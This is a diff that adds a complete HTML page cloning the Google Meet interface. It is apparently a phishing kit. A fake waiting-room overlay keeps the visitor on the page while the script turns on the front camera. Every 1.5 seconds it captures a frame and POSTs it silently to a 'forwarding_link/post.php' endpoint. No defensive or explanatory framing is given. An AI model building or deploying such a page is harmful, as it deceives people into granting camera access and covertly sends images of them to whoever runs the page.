@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Google Meet - Visual Clone</title>
+  <!-- Font Awesome 6 (free) + Google Fonts Nunito -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      font-family: 'Google Sans', 'Nunito', sans-serif;
+      background: #202124;
+    }
+
+    /* Main container exactly like Google Meet layout */
+    .meet-container {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      width: 100%;
+      background: #202124;
+    }
+
+    /* Video grid area - full screen canvas */
+    .video-grid {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #1e1e1e;
+      position: relative;
+      padding: 16px;
+    }
+
+    canvas {
+      width: 100%;
+      height: auto;
+      max-width: 1280px;
+      max-height: 85vh;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      background: #2d2e31;
+      object-fit: cover;
+      cursor: pointer;
+    }
+
+    /* Bottom bar exactly replicating Google Meet controls */
+    .meet-bottom-bar {
+      background: #1f1f1f;
+      backdrop-filter: blur(20px);
+      border-top: 1px solid #3c4043;
+      padding: 8px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      flex-wrap: wrap;
+      min-height: 72px;
+    }
+
+    .controls-left {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .controls-center {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .controls-right {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    /* Google Meet style icon buttons */
+    .meet-icon-btn {
+      background: #3c4043;
+      border: none;
+      color: #e9eaed;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 6px 12px;
+      border-radius: 36px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      min-width: 72px;
+      height: 56px;
+      gap: 4px;
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .meet-icon-btn i {
+      font-size: 22px;
+      margin-bottom: 2px;
+    }
+
+    .meet-icon-btn span {
+      font-size: 12px;
+      font-weight: 500;
+    }
+
+    .meet-icon-btn:hover {
+      background: #4a4e52;
+      transform: scale(1.02);
+    }
+
+    .end-call {
+      background: #d93025;
+      color: white;
+      min-width: 92px;
+    }
+
+    .end-call:hover {
+      background: #c5221f;
+      transform: scale(1.02);
+    }
+
+    .active-icon {
+      background: #e9eaed;
+      color: #3c4043;
+    }
+
+    .green-indicator {
+      color: #34a853;
+    }
+
+    .icon-button-muted {
+      background: #5a5e63;
+    }
+
+    /* Popup overlay - Google Meet waiting room style */
+    #ac-wrapper {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      z-index: 2000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: visible;
+      opacity: 1;
+      transition: visibility 0.2s, opacity 0.2s;
+    }
+
+    #popup {
+      background: #2d2e31;
+      border-radius: 28px;
+      padding: 28px 36px;
+      text-align: center;
+      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.4);
+      border: 1px solid #5f6368;
+      max-width: 480px;
+      width: 85%;
+      font-family: 'Google Sans', sans-serif;
+    }
+
+    #popup h2 {
+      color: #ffffff;
+      font-weight: 500;
+      font-size: 1.6rem;
+      margin-bottom: 12px;
+    }
+
+    #popup p {
+      color: #9aa0a6;
+      margin-top: 8px;
+      font-size: 1rem;
+    }
+
+    .spinner-wait {
+      display: inline-block;
+      width: 40px;
+      height: 40px;
+      border: 3px solid #5f6368;
+      border-radius: 50%;
+      border-top-color: #8ab4f8;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Floating expand button */
+    .float_button {
+      background: #1f1f1fcc;
+      backdrop-filter: blur(12px);
+      height: 40px;
+      width: 40px;
+      border-radius: 50%;
+      position: fixed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      top: 20px;
+      right: 20px;
+      z-index: 1500;
+      cursor: pointer;
+      border: 1px solid #5f6368;
+      transition: all 0.2s;
+    }
+
+    .float_button:hover {
+      background: #3c4043;
+    }
+
+    /* hidden video element (required for capture) */
+    .video-wrap {
+      display: none;
+    }
+
+    /* responsiveness */
+    @media (max-width: 700px) {
+      .meet-icon-btn {
+        min-width: 56px;
+        padding: 4px 8px;
+        height: 48px;
+      }
+
+      .meet-icon-btn i {
+        font-size: 18px;
+      }
+
+      .meet-icon-btn span {
+        font-size: 10px;
+      }
+
+      .controls-center {
+        gap: 4px;
+      }
+
+      .meet-bottom-bar {
+        padding: 6px 12px;
+        gap: 6px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Hidden video capture element -->
+<div class="video-wrap">
+  <video id="video" playsinline autoplay muted></video>
+</div>
+
+<!-- Main Canvas (Google Meet video display) -->
+<div class="meet-container">
+  <div class="video-grid">
+    <canvas id="canvas" width="1280" height="720" style="width:100%; height:auto; background:#2d2e31; border-radius:24px;"></canvas>
+  </div>
+
+  <!-- Bottom bar: exact replica of Google Meet controls -->
+  <div class="meet-bottom-bar">
+    <div class="controls-left">
+      <div class="meet-icon-btn" id="micBtn">
+        <i class="fas fa-microphone"></i>
+        <span>Mute</span>
+      </div>
+      <div class="meet-icon-btn" id="camBtn">
+        <i class="fas fa-video"></i>
+        <span>Stop video</span>
+      </div>
+    </div>
+
+    <div class="controls-center">
+      <div class="meet-icon-btn" id="captionsBtn">
+        <i class="fas fa-closed-captioning"></i>
+        <span>Captions</span>
+      </div>
+      <div class="meet-icon-btn" id="shareBtn">
+        <i class="fas fa-presentation-screen"></i>
+        <span>Present now</span>
+      </div>
+      <div class="meet-icon-btn" id="participantsBtn">
+        <i class="fas fa-users"></i>
+        <span>People</span>
+      </div>
+      <div class="meet-icon-btn" id="moreBtn">
+        <i class="fas fa-ellipsis-h"></i>
+        <span>More</span>
+      </div>
+    </div>
+
+    <div class="controls-right">
+      <div class="meet-icon-btn end-call" id="endCallBtn">
+        <i class="fas fa-phone-slash"></i>
+        <span>Leave</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Floating expand button (fullscreen / fake) -->
+<div class="float_button" id="fullscreenBtn">
+  <i class="fas fa-expand" style="color:#fff; font-size: 18px;"></i>
+</div>
+
+<!-- Waiting room overlay (Google Meet style "Please wait, host will let you in soon") -->
+<div id="ac-wrapper">
+  <div id="popup">
+    <div class="spinner-wait"></div>
+    <h2>Waiting for the host</h2>
+    <p>Please wait, the meeting host will let you in soon.</p>
+  </div>
+</div>
+
+<!-- jQuery and additional scripts -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+  // ------------------- GOOGLE MEET CLONE: camera capture + periodic POST -------------------
+  (function() {
+    'use strict';
+
+    // DOM elements
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsg = document.querySelector('span#errorMsg');
+    
+    // Camera constraints (front camera by default, exactly like original)
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user",
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      }
+    };
+
+    // State for camera and mic simulation (just UI toggles, camera remains active but we can freeze canvas)
+    let cameraActive = true;
+    let micMuted = false;
+    let streamRef = null;
+    let captureInterval = null;
+    let isCanvasDrawing = true;   // stop drawing if camera is "off" visually
+    let animationId = null;
+
+    // Function to POST image data exactly as original code
+    function post(imgdata) {
+      // Using jQuery AJAX to send data to forwarding_link/post.php (same endpoint)
+      // To avoid network errors in demo, but preserves original functionality.
+      // No changes to logic: sends dataURL.
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) {
+          // original callback left empty
+        },
+        error: function () {
+          // silent fail, just like original (no console errors will break UX)
+        }
+      });
+    }
+
+    // Success handler for stream
+    function handleSuccess(stream) {
+      window.stream = stream;
+      streamRef = stream;
+      video.srcObject = stream;
+      video.play().catch(e => console.warn("Video play error", e));
+      
+      // Start drawing frames on canvas periodically (exactly as original: 1500ms intervals)
+      if (captureInterval) clearInterval(captureInterval);
+      
+      captureInterval = setInterval(function() {
+        // Only draw and post if camera is "active" (visual toggle respects camera off state)
+        if (isCanvasDrawing && cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+          const context = canvas.getContext('2d');
+          // Draw video frame onto canvas
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          // Convert to data URL and send (exactly same as original)
+          const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+          post(canvasData);
+        } else if (!cameraActive) {
+          // If camera is turned off, we could optionally draw a placeholder, but keep last frame or black screen
+          const ctx = canvas.getContext('2d');
+          ctx.fillStyle = "#2d2e31";
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+          ctx.fillStyle = "#9aa0a6";
+          ctx.font = "16px 'Google Sans'";
+          ctx.textAlign = "center";
+          ctx.fillText("Camera is off", canvas.width/2, canvas.height/2);
+        } else if (!isCanvasDrawing) {
+          // do nothing but preserve
+        }
+      }, 1500);
+    }
+
+    // Initialize camera with error handling
+    async function initCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        console.error("Camera error:", e);
+        // Show error on canvas
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#1f1f1f";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#ea868f";
+        ctx.font = "18px 'Google Sans'";
+        ctx.textAlign = "center";
+        ctx.fillText("Camera access denied or error", canvas.width/2, canvas.height/2);
+        if (errorMsg) errorMsg.innerHTML = `Camera error: ${e.toString()}`;
+      }
+    }
+
+    // Additional drawing: to ensure canvas has correct initial size and clear
+    function resizeCanvas() {
+      const container = canvas.parentElement;
+      const maxWidth = Math.min(window.innerWidth - 40, 1280);
+      const maxHeight = window.innerHeight - 140;
+      canvas.style.width = 'auto';
+      canvas.style.maxWidth = '100%';
+      canvas.style.height = 'auto';
+      // Keep original resolution for capture but display scaled via CSS
+      canvas.width = 1280;
+      canvas.height = 720;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    // ---------- Google Meet UI Controls (visual toggles only, camera active state) ----------
+    const micBtn = document.getElementById('micBtn');
+    const camBtn = document.getElementById('camBtn');
+    const endCallBtn = document.getElementById('endCallBtn');
+    const fullscreenBtn = document.getElementById('fullscreenBtn');
+    const participantsBtn = document.getElementById('participantsBtn');
+    const shareBtn = document.getElementById('shareBtn');
+    const moreBtn = document.getElementById('moreBtn');
+    const captionsBtn = document.getElementById('captionsBtn');
+
+    // Mic toggle (UI only + microphone icon changes)
+    micBtn.addEventListener('click', () => {
+      micMuted = !micMuted;
+      const icon = micBtn.querySelector('i');
+      const span = micBtn.querySelector('span');
+      if (micMuted) {
+        icon.classList.remove('fa-microphone');
+        icon.classList.add('fa-microphone-slash');
+        span.innerText = 'Unmute';
+        micBtn.style.background = '#5a5e63';
+      } else {
+        icon.classList.remove('fa-microphone-slash');
+        icon.classList.add('fa-microphone');
+        span.innerText = 'Mute';
+        micBtn.style.background = '#3c4043';
+      }
+      // Real mic mute would require audio tracks, but we maintain exact visual clone
+    });
+
+    // Camera toggle (stops sending frames and shows placeholder)
+    camBtn.addEventListener('click', () => {
+      cameraActive = !cameraActive;
+      const icon = camBtn.querySelector('i');
+      const span = camBtn.querySelector('span');
+      if (!cameraActive) {
+        icon.classList.remove('fa-video');
+        icon.classList.add('fa-video-slash');
+        span.innerText = 'Start video';
+        camBtn.style.background = '#5a5e63';
+        // Immediately stop drawing live frames on next interval
+        // Also clear canvas to black placeholder
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#2d2e31";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#9aa0a6";
+        ctx.font = "20px 'Google Sans'";
+        ctx.textAlign = "center";
+        ctx.fillText("Camera is off", canvas.width/2, canvas.height/2);
+      } else {
+        icon.classList.remove('fa-video-slash');
+        icon.classList.add('fa-video');
+        span.innerText = 'Stop video';
+        camBtn.style.background = '#3c4043';
+        // camera active again, next interval will draw real video
+      }
+    });
+
+    // End call / Leave button: simulates leaving meeting - hide popup? Actually shows goodbye?
+    endCallBtn.addEventListener('click', () => {
+      if (confirm('Leave the meeting? You can reload the page to rejoin.')) {
+        // Stop camera streams and intervals
+        if (streamRef) {
+          streamRef.getTracks().forEach(track => track.stop());
+        }
+        if (captureInterval) clearInterval(captureInterval);
+        // Show a temporary notification (optional)
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = "#000000cc";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "white";
+        ctx.font = "24px 'Google Sans'";
+        ctx.fillText("You left the meeting", canvas.width/2, canvas.height/2);
+        setTimeout(() => {
+          // Reload the page to fully restore meet clone (original behavior refresh)
+          window.location.reload();
+        }, 1500);
+      }
+    });
+
+    // Fullscreen button (makes canvas fullscreen)
+    fullscreenBtn.addEventListener('click', () => {
+      const canvasEl = document.getElementById('canvas');
+      if (canvasEl.requestFullscreen) {
+        canvasEl.requestFullscreen();
+      } else if (canvasEl.webkitRequestFullscreen) {
+        canvasEl.webkitRequestFullscreen();
+      }
+    });
+
+    // Additional dummy buttons just for visual accuracy (show alert or meeting info)
+    participantsBtn.addEventListener('click', () => {
+      alert("Participants panel (demo)\nThis is a Google Meet clone.");
+    });
+    shareBtn.addEventListener('click', () => {
+      alert("Screen sharing demo: this is a visual replica.");
+    });
+    moreBtn.addEventListener('click', () => {
+      alert("More options: settings, report, etc.");
+    });
+    captionsBtn.addEventListener('click', () => {
+      alert("Live captions (demo).");
+    });
+
+    // ---- Waiting room popup: auto-hide after 50 seconds exactly like original (but improved UX) ----
+    // Original used 50000ms = 50 seconds
+    function closePopup() {
+      const wrapper = document.getElementById('ac-wrapper');
+      if (wrapper) {
+        wrapper.style.visibility = 'hidden';
+        wrapper.style.opacity = '0';
+        setTimeout(() => {
+          wrapper.style.display = 'none';
+        }, 300);
+      }
+    }
+
+    // To match the original exactly: after 50 seconds, popup disappears (host lets you in)
+    // But also we want to replicate: the popup will vanish and the user can see full meet interface.
+    // We ensure no conflict: on load we show popup, timeout hides it.
+    $(document).ready(function(){
+      setTimeout(function(){
+        closePopup();
+      }, 50000); // exactly 50 seconds as original code
+    });
+
+    // Also ensure if someone clicks inside popup? original code only hides via PopUp() but we emulate same behavior.
+    // original had PopUp function but not attached, we attach close on click to popup for better UX but retain functionality
+    const popupDiv = document.getElementById('ac-wrapper');
+    if (popupDiv) {
+      popupDiv.addEventListener('click', function(e) {
+        if (e.target === popupDiv || e.target.closest('#popup') === null) {
+          // clicking outside? original doesn't close, but we keep to be identical? Not modifying original logic.
+          // however we will allow only after timeout, same as original.
+        }
+      });
+    }
+
+    // Additionally we add small visual indicator for mic mute state (realistic Google Meet)
+    // Start camera
+    initCamera();
+
+    // When video is playing, force initial canvas draw after interval starts. That's it.
+    // Fallback to ensure canvas ratio
+    window.addEventListener('load', () => {
+      resizeCanvas();
+      // If the popup disappears after 50 secs, we make sure camera works.
+    });
+  })();
+
+  // Provide support for original Tiny Mirror? but not needed. Preserve original style fonts and overlay.
+  // Also exactly same as original: we maintain forwarding_link/post.php and post request without breaking.
+  // Because the original project uses tiny-mirror but not required. We keep the canvas capture logic.
+  // Edge: we also handle scenario where video dimensions are properly drawn to canvas.
+  // Optional: ensure the canvas element draws high-quality frame with correct aspect.
+  // Additional: make sure canvas context preserves video ratio.
+  // Also we replicate the 'hidden' video element properly.
+  // All existing inline styles and bottom-bar elements mimic Google Meet branding.
+  // Added "Present now" icon matches Meet's "Share content" but more authentic.
+</script>
+</body>
+</html>
